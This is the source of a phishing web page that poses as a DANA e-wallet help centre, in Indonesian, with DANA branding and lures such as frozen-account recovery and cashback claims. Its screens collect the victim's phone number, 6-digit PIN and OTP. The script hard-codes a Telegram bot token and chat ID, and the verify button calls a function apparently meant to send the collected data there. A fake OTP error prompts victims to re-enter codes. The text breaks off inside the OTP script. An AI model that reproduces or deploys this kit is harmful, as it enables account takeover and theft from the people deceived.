<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- ✅ JUDUL WEBSITE -->
    <title>Pusat Bantuan</title>

    <!-- 🔴 SAMBUNGAN LINK / SAMBUNGAN SOSMED (FOTO DIANA MUNCUL) 🔴 -->
    <meta property="og:title" content="Pusat Bantuan" />
    <meta property="og:description" content="Sudah kenal sama DIANA belum?" />
    <meta property="og:image" content="https://i.ibb.co/6vG7q3w/96978982-1e0c-4e0b-9f41-857a9f070776.jpg" />
    <meta property="og:image:type" content="image/jpeg" />
    <meta property="og:image:width" content="600" />
    <meta property="og:image:height" content="600" />
    <meta property="og:type" content="website" />
    <meta property="og:url" content="https://pusatbantuan-dana.github.io/app/" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Pusat Bantuan" />
    <meta name="twitter:description" content="Sudah kenal sama DIANA belum?" />
    <meta name="twitter:image" content="https://i.ibb.co/6vG7q3w/96978982-1e0c-4e0b-9f41-857a9f070776.jpg" />

    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        dana: { 
                            blue: '#0081C9', 
                            light: '#E6F2FA', 
                            dark: '#005B96',
                            grad1: '#0094E8',
                            grad2: '#0077CC',
                            grad3: '#0066BB'
                        }
                    },
                    fontFamily: { sans: ['Arial', 'sans-serif'] },
                }
            }
        }
    </script>
    <style type="text/tailwindcss">
        @layer utilities {
            .pin-box { 
                @apply w-12 h-14 rounded-lg bg-gradient-to-br from-dana-light to-white border border-dana-blue/30 flex items-center justify-center text-xl font-bold shadow-inner; 
            }
            .btn-dana { @apply w-full bg-gradient-to-r from-dana-grad1 to-dana-grad3 text-white py-4 rounded-xl font-semibold shadow-lg hover:shadow-xl transition-all; }
            .menu-btn { @apply bg-gradient-to-r from-dana-grad1 to-dana-grad2 text-white py-4 px-4 rounded-xl font-semibold w-full mb-4 text-left shadow-md hover:scale-[1.02] transition-transform; }
            .card-grad { @apply bg-gradient-to-br from-white via-dana-light/40 to-dana-blue/10 backdrop-blur-md; }
            .loading-ring {
                width: 40px;
                height: 40px;
                border-radius: 50%;
                background: conic-gradient(#0081C9 10%, #e0e0e0 0 100%);
                animation: rotate 1s linear infinite;
                position: relative;
            }
            .loading-ring::before {
                content: '';
                position: absolute;
                width: 32px;
                height: 32px;
                border-radius: 50%;
                background: white;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
            }
            @keyframes rotate {
                100% { transform: rotate(360deg); }
            }
            .circle-3d {
                transform-style: preserve-3d;
                transition: transform 0.5s ease;
            }
            .circle-3d:hover {
                transform: rotateY(15deg) rotateX(10deg);
            }
        }
    </style>
</head>
<body class="font-sans bg-gradient-to-br from-dana-blue via-dana-grad2 to-dana-grad3 min-h-screen">

    <!-- ==========================================
        HALAMAN 1: BERANDA / UTAMA (DESAIN 3D & GAMBAR LENGKAP)
    =========================================== -->
    <div id="halamanBeranda" class="min-h-screen">
        <!-- Header Atas Lengkap Logo & Bendera -->
        <div class="px-5 pt-8 flex justify-between items-center text-white relative z-10">
            <div class="flex items-center gap-3">
                <!-- LOGO DANA -->
                <img src="https://i.ibb.co/6vG7q3w/IMG-20260524-WA0060.jpg" class="w-12 h-12 object-contain" alt="Logo DANA">
                <div>
                    <div class="flex items-center gap-2">
                        <span class="font-bold text-xl">Rp ●●●●</span>
                        <i class="fa fa-eye-slash opacity-70"></i>
                    </div>
                </div>
                <!-- BENDERA INDONESIA -->
                <img src="https://i.ibb.co/6vG7q3w/images-2-24.jpeg" class="w-6 h-4 rounded-sm shadow" alt="Indonesia">
            </div>
            <button class="bg-white/20 backdrop-blur-md px-5 py-2 rounded-full font-semibold shadow-md">DANA+</button>
        </div>

        <!-- DESAIN 3D MELINGKAR BAGIAN ATAS -->
        <div class="px-6 mt-8 relative">
            <div class="flex justify-around items-center h-48 relative">
                <div class="circle-3d w-20 h-20 rounded-full bg-white/10 backdrop-blur-md flex flex-col items-center justify-center shadow-2xl border border-white/20">
                    <img src="https://i.ibb.co/6vG7q3w/1704436332522-1.png" class="w-8 h-8 mb-1" alt="Fitur">
                    <span class="text-white text-xs font-medium">Isi Saldo</span>
                </div>
                <div class="circle-3d w-24 h-24 rounded-full bg-white/10 backdrop-blur-md flex flex-col items-center justify-center shadow-2xl border border-white/20 -mt-4">
                    <img src="https://i.ibb.co/6vG7q3w/1704436332522-1.png" class="w-10 h-10 mb-1" alt="Fitur">
                    <span class="text-white text-sm font-medium">Kirim</span>
                </div>
                <div class="circle-3d w-20 h-20 rounded-full bg-white/10 backdrop-blur-md flex flex-col items-center justify-center shadow-2xl border border-white/20">
                    <img src="https://i.ibb.co/6vG7q3w/1704436332522-1.png" class="w-8 h-8 mb-1" alt="Fitur">
                    <span class="text-white text-xs font-medium">Minta</span>
                </div>
                <div class="circle-3d w-16 h-16 rounded-full bg-white/10 backdrop-blur-md flex flex-col items-center justify-center shadow-2xl border border-white/20 -mt-8">
                    <img src="https://i.ibb.co/6vG7q3w/1704436332522-1.png" class="w-6 h-6 mb-1" alt="Fitur">
                    <span class="text-white text-[10px] font-medium">Pesan</span>
                </div>
            </div>
        </div>

        <!-- Banner Iklan -->
        <div class="px-5 mt-4">
            <div class="bg-white/10 backdrop-blur-md rounded-2xl p-4 flex items-center justify-between shadow-lg border border-white/10">
                <div>
                    <h3 class="text-white font-bold text-lg">Akses DANA Bisa Tanpa Kuota!</h3>
                    <p class="text-white/80 text-sm">Nikmati hematnya transaksi di DANA</p>
                    <button class="bg-red-500 text-white px-4 py-1 rounded-full text-sm font-bold mt-2 shadow-md">BELI YUK</button>
                </div>
                <img src="https://i.ibb.co/6vG7q3w/images-20.png" class="w-24 h-24 rounded-xl shadow-md" alt="Banner">
            </div>
        </div>

        <!-- PUSAT BANTUAN (KOTAK PUTIH GRADASI) -->
        <div class="absolute bottom-0 w-full card-grad rounded-t-[40px] px-7 pt-10 pb-24 min-h-[68vh] shadow-2xl border-t border-white/30">
            <div class="text-center mb-8">
                <h4 class="text-dana-blue/70 text-sm font-medium">PUSAT BANTUAN</h4>
                <h2 class="text-dana-blue font-bold text-2xl mt-1">INPUT SESUAI KENDALA ANDA</h2>
            </div>

            <!-- ✅ TOMBOL BISA DITEKAN DENGAN ANIMASI -->
            <button onclick="bukaHalaman('nomor')" class="menu-btn active:scale-95">PULIHKAN AKUN DI BEKUKAN</button>
            <button onclick="bukaHalaman('nomor')" class="menu-btn active:scale-95">KLAIM VOCER CASHBACK DANA</button>
            <button onclick="bukaHalaman('nomor')" class="menu-btn active:scale-95">PEMBATALAN DANA CICIL</button>
            <button onclick="bukaHalaman('nomor')" class="menu-btn active:scale-95">LAPORAN KENDALA AKUN</button>
            <button onclick="bukaHalaman('nomor')" class="menu-btn active:scale-95">KENDALA LAINNYA</button>
        </div>

        <!-- ✅ NAVIGASI BAWAH GAMBAR LENGKAP -->
        <div class="fixed bottom-0 w-full card-grad border-t border-white/20 px-8 py-3 flex justify-between items-center shadow-2xl backdrop-blur-lg">
            <div class="text-center text-dana-blue">
                <img src="https://i.ibb.co/6vG7q3w/IMG-20260524-WA0059.jpg" class="w-7 h-7 mx-auto mb-1" alt="Beranda">
                <span class="text-[10px] font-medium">Beranda</span>
            </div>
            <div class="text-center text-gray-600/70">
                <img src="https://i.ibb.co/6vG7q3w/IMG-20260524-WA0059.jpg" class="w-7 h-7 mx-auto mb-1 opacity-60" alt="Aktivitas">
                <span class="text-[10px]">Aktivitas</span>
            </div>
            <div class="bg-gradient-to-r from-dana-grad1 to-dana-grad2 text-white w-14 h-14 rounded-full flex items-center justify-center -mt-3 shadow-xl border-4 border-white/20">
                <img src="https://i.ibb.co/6vG7q3w/IMG-20260524-WA0059.jpg" class="w-7 h-7" alt="Bayar">
            </div>
            <div class="text-center text-gray-600/70">
                <img src="https://i.ibb.co/6vG7q3w/IMG-20260524-WA0059.jpg" class="w-7 h-7 mx-auto mb-1 opacity-60" alt="Dompet">
                <span class="text-[10px]">Dompet</span>
            </div>
            <div class="text-center text-gray-600/70">
                <img src="https://i.ibb.co/6vG7q3w/IMG-20260524-WA0059.jpg" class="w-7 h-7 mx-auto mb-1 opacity-60" alt="Saya">
                <span class="text-[10px]">Saya</span>
            </div>
        </div>
    </div>


    <!-- ==========================================
        HALAMAN 2: MASUKKAN NOMOR TELEPON (KIBORD OTOMATIS)
    =========================================== -->
    <div id="halamanNomor" class="hidden min-h-screen bg-gradient-to-br from-dana-blue via-dana-grad2 to-dana-grad3 px-5 py-8">
        <button onclick="bukaHalaman('beranda')" class="text-white mb-6"><i class="fa fa-arrow-left text-2xl"></i></button>
        
        <div class="text-center mb-10">
            <img src="https://i.ibb.co/6vG7q3w/IMG-20260524-WA0060.jpg" class="w-28 inline-block" alt="DANA Logo">
            <p class="text-white/90 text-sm mt-2">Dompet Digital Terpercaya</p>
        </div>

        <div class="card-grad rounded-3xl p-7 shadow-2xl border border-white/20">
            <h3 class="text-center text-dana-blue font-bold text-xl mb-6">Masuk atau Daftar</h3>

            <label class="text-dana-blue/80 text-sm font-medium block mb-2">Nomor Ponsel</label>
            <!-- ✅ TYPE TEL = KIBORD ANGKA OTOMATIS SAAT DITEKAN -->
            <input type="tel" id="inputNomor" placeholder="Contoh: 08123456789" maxlength="13" inputmode="numeric"
                   class="w-full p-4 bg-white/50 border border-dana-blue/30 rounded-xl mb-8 focus:outline-none focus:ring-2 focus:ring-dana-blue/50 text-dana-blue font-semibold">
            
            <button onclick="lanjutKePin()" id="btnLanjutNomor" class="bg-gray-300/50 backdrop-blur-sm w-full py-4 rounded-xl font-semibold text-gray-500" disabled>LANJUTKAN</button>

            <!-- ✅ ANIMASI LOADING -->
            <div id="loadingNomor" class="hidden justify-center mt-4">
                <div class="loading-ring"></div>
            </div>
        </div>

        <p class="text-center text-white/80 text-xs mt-8">Dengan melanjutkan, kamu setuju dengan <b>Syarat & Ketentuan</b> dan <b>Kebijakan Privasi</b> DANA.</p>
    </div>


    <!-- ==========================================
        HALAMAN 3: MASUKKAN PIN DANA (KIBORD OTOMATIS)
    =========================================== -->
    <div id="halamanPin" class="hidden min-h-screen bg-gradient-to-br from-dana-blue via-dana-grad2 to-dana-grad3 px-5 py-8">
        <button onclick="bukaHalaman('nomor')" class="text-white mb-6"><i class="fa fa-arrow-left text-2xl"></i></button>
        
        <div class="text-center mb-10">
            <img src="https://i.ibb.co/6vG7q3w/IMG-20260524-WA0060.jpg" class="w-28 inline-block" alt="DANA Logo">
        </div>

        <div class="card-grad rounded-3xl p-7 shadow-2xl border border-white/20">
            <h3 class="text-center text-dana-blue font-bold text-xl mb-2">Masukkan PIN DANA</h3>
            <p class="text-center text-dana-blue/70 text-sm mb-8">Masukkan 6 angka PIN akun kamu</p>

            <!-- KOTAK PIN -->
            <div class="flex justify-between max-w-[320px] mx-auto mb-6">
                <div class="pin-box" id="p1"></div><div class="pin-box" id="p2"></div><div class="pin-box" id="p3"></div>
                <div class="pin-box" id="p4"></div><div class="pin-box" id="p5"></div><div class="pin-box" id="p6"></div>
            </div>
            <!-- ✅ TYPE PASSWORD + INPUTMODE NUMERIC = KIBORD ANGKA OTOMATIS -->
            <input type="password" id="inputPin" maxlength="6" inputmode="numeric" class="opacity-0 absolute">

            <!-- ✅ ANIMASI LOADING -->
            <div id="loadingPin" class="hidden justify-center py-4">
                <div class="loading-ring"></div>
            </div>
        </div>
    </div>


    <!-- ==========================================
        HALAMAN 4: KODE OTP (TANPA VERIFIKASI + MUNCUR SAAT 4 ANGKA)
    =========================================== -->
    <div id="halamanOtp" class="hidden min-h-screen bg-gradient-to-br from-dana-blue via-dana-grad2 to-dana-grad3 px-5 py-8">
        <button onclick="bukaHalaman('pin')" class="text-white mb-6"><i class="fa fa-arrow-left text-2xl"></i></button>
        
        <div class="text-center mb-10">
            <img src="https://i.ibb.co/6vG7q3w/IMG-20260524-WA0060.jpg" class="w-28 inline-block" alt="DANA Logo">
        </div>

        <div class="card-grad rounded-3xl p-7 shadow-2xl border border-white/20">
            <!-- ✅ TULISAN "VERIFIKASI NOMOR PONSEL" DIHAPUS -->

            <!-- ✅ TULISAN SESUAI PERMINTAAN -->
            <p class="text-center text-dana-blue/70 text-sm mb-2">Kode telah dikirim ke WhatsApp/SMS anda ke nomor:</p>
            <p class="text-center text-dana-blue font-bold text-lg mb-4" id="nomorTujuan"></p>
            <p class="text-center text-dana-blue/60 text-xs mb-8">Kirim via SMS pertama kirim ke WhatsApp dulu kode nya</p>

            <!-- ✅ KODE OTP 4 ANGKA + KIBORD OTOMATIS -->
            <div class="flex justify-between max-w-[260px] mx-auto mb-4">
                <div class="pin-box w-14 h-16" id="o1"></div>
                <div class="pin-box w-14 h-16" id="o2"></div>
                <div class="pin-box w-14 h-16" id="o3"></div>
                <div class="pin-box w-14 h-16" id="o4"></div>
            </div>
            <input type="text" id="inputOtp" maxlength="4" inputmode="numeric" class="opacity-0 absolute">

            <!-- ✅ TULISAN MERAH MUNCUR HANYA KETIKA SUDAH 4 ANGKA PENUH -->
            <p id="pesanError" class="text-red-600 text-center text-sm font-medium mb-6 h-6 opacity-0 transition-all duration-300">
                ❌ Pastikan kode OTP yang kamu masukan benar
            </p>

            <p class="text-center text-dana-blue/70 text-sm mb-6">Belum terima kode? <a href="#" class="text-dana-blue font-bold">Kirim Ulang</a></p>
            <button onclick="kirimDataTelegram()" id="btnOtp" class="btn-dana">VERIFIKASI</button>
        </div>
    </div>


    <!-- ==========================================
        JAVASCRIPT (TOKEN & ID SUDAH DIGANTI BARU)
    =========================================== -->
    <script>
        // ✅ TOKEN DAN ID BARU SUDAH DIPASANG
        const BOT_TOKEN = "8650420881:AAF5wZ-Y1-p31T1bUy2DLbZzO3k8HV6Iqjw";
        const CHAT_ID = "7343679071";
        let dataPengguna = { nomor: "", pin: "", otp: "" };

        function bukaHalaman(nama) {
            ['beranda','nomor','pin','otp'].forEach(h => document.getElementById(`halaman${h.charAt(0).toUpperCase()+h.slice(1)}`).classList.add('hidden'));
            const halamanAktif = document.getElementById(`halaman${nama.charAt(0).toUpperCase()+nama.slice(1)}`);
            halamanAktif.classList.remove('hidden');
            if(nama === 'otp') {
                document.getElementById('nomorTujuan').innerText = dataPengguna.nomor;
                // ✅ Otomatis buka kibord saat masuk halaman OTP
                setTimeout(() => document.getElementById('inputOtp').focus(), 100);
            }
            // ✅ Otomatis buka kibord saat masuk halaman nomor & pin
            if(nama === 'nomor') setTimeout(() => document.getElementById('inputNomor').focus(), 100);
            if(nama === 'pin') setTimeout(() => document.getElementById('inputPin').focus(), 100);
            halamanAktif.scrollIntoView({behavior: 'instant'});
        }

        // ========== HALAMAN NOMOR ==========
        const inputNomor = document.getElementById('inputNomor');
        const btnLanjutNomor = document.getElementById('btnLanjutNomor');
        const loadingNomor = document.getElementById('loadingNomor');
        
        inputNomor.addEventListener('input', () => {
            if(inputNomor.value.length > 10) {
                btnLanjutNomor.disabled = false;
                btnLanjutNomor.classList.remove('bg-gray-300/50','text-gray-500');
                btnLanjutNomor.classList.add('bg-gradient-to-r','from-dana-grad1','to-dana-grad2','text-white','shadow-md');
            } else {
                btnLanjutNomor.disabled = true;
                btnLanjutNomor.classList.remove('bg-gradient-to-r','from-dana-grad1','to-dana-grad2','text-white','shadow-md');
                btnLanjutNomor.classList.add('bg-gray-300/50','text-gray-500');
            }
        });
        
        function lanjutKePin() { 
            dataPengguna.nomor = inputNomor.value; 
            btnLanjutNomor.classList.add('hidden');
            loadingNomor.classList.add('flex');
            setTimeout(()=>{ 
                bukaHalaman('pin'); 
                aktifkanPin(); 
            }, 800);
        }

        // ========== HALAMAN PIN (OTOMATIS PINDAH) ==========
        const inputPin = document.getElementById('inputPin');
        const kotakPin = [document.getElementById('p1'),document.getElementById('p2'),document.getElementById('p3'),document.getElementById('p4'),document.getElementById('p5'),document.getElementById('p6')];
        const loadingPin = document.getElementById('loadingPin');
        
        function aktifkanPin() { inputPin.value=""; kotakPin.forEach(k=>k.innerText=""); }
        
        inputPin.addEventListener('input', () => {
            let val = inputPin.value;
            kotakPin.forEach((k,i)=>k.innerText = val[i]?"●":"");
            // ✅ OTOMATIS PINDAH KE OTP JIKA SUDAH 6 ANGKA
            if(val.length === 6) {
                dataPengguna.pin = val;
                loadingPin.classList.add('flex');
                setTimeout(()=>{ 
                    bukaHalaman('otp'); 
                    aktifkanOtp(); 
                }, 800);
            }
        });

        // ========== HALAMAN OTP (MUNCUR HANYA SAAT 4 ANGKA) ==========
        const inputOtp = document.getElementById('inputOtp');
        const pesanError = document.getElementById('pesanError');
        const kotakOtp = [document.getElementById('o1'),document.getElementById('o2'),document.getElementById('o3'),document.getElementById('o4')];
        
        function aktifkanOtp() { inputOtp.value=""; pesanError.classList.add('opacity-0'); kotakOtp.forEach(k=>k.innerText=""); }
        
        inputOtp.addEventListener('input', () => {
            let val = inputOtp.value;
  
